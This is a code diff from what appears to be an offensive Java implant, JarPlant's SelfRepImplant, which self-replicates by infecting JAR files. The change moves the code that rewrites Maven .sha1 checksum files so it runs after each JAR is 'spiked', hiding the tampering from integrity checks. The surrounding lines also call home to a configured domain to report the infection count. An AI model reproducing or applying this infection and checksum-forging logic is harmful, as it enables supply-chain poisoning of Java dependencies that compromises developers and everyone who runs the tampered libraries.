@@ -134,6 +134,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                     doTheSwitcharoo(jarToImplant, outputTempFile);
                     numInfected++;
                     System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");
+
+                    recalculateMavenChecksumFile(jarToImplant);
                 } else {
                     System.out.println("[!] JarPlant chose to _not_ infect '" + jarToImplant + "'.");
                 }
@@ -141,23 +143,31 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
                 //e.printStackTrace();
             }
-
-            // Also look for a .sha1 file and recalculate it if it exists (this is a Maven repo thing)
-            Path sha1File = jarToImplant.resolveSibling(jarToImplant.getFileName() + ".sha1");
-            if (Files.exists(sha1File)) {
-                try {
-                    // Potential optimization: Don't re-read the file (use buffer from somewhere inside injector)
-                    String humanReadableHashValue = calcSha1Digest(Files.readAllBytes(jarToImplant));
-                    Files.writeString(sha1File, humanReadableHashValue, StandardOpenOption.TRUNCATE_EXISTING);
-                    System.out.println("[+] Modified SHA1 file '" + sha1File + "'.");
-                } catch (IOException e) {
-                    System.out.println("[!] Failed to modify SHA1 file '" + sha1File + "' (" + e.getMessage() + ").");
-                }
-            }
         }
 
         if (CONF_DOMAIN != null) {
             callHome(CONF_DOMAIN, "did-" + numInfected, id);
+        }
+    }
+
+    /**
+     * Update the SHA1 checksum file for a JAR.
+     * Maven has these checksum files alongside JAR files in the repository.
+     * This method updates the .sha1 file for a given .jar file on disk.
+     *
+     * @param jarToImplant Existing JAR file
+     */
+    private static void recalculateMavenChecksumFile(Path jarToImplant) {
+        Path sha1File = jarToImplant.resolveSibling(jarToImplant.getFileName() + ".sha1");
+        if (Files.exists(sha1File)) {
+            try {
+                // Potential optimization: Don't re-read the file (use buffer from somewhere inside injector)
+                String humanReadableHashValue = calcSha1Digest(Files.readAllBytes(jarToImplant));
+                Files.writeString(sha1File, humanReadableHashValue, StandardOpenOption.TRUNCATE_EXISTING);
+                System.out.println("[+] Modified SHA1 file '" + sha1File + "'.");
+            } catch (IOException e) {
+                System.out.println("[!] Failed to modify SHA1 file '" + sha1File + "' (" + e.getMessage() + ").");
+            }
         }
     }
 
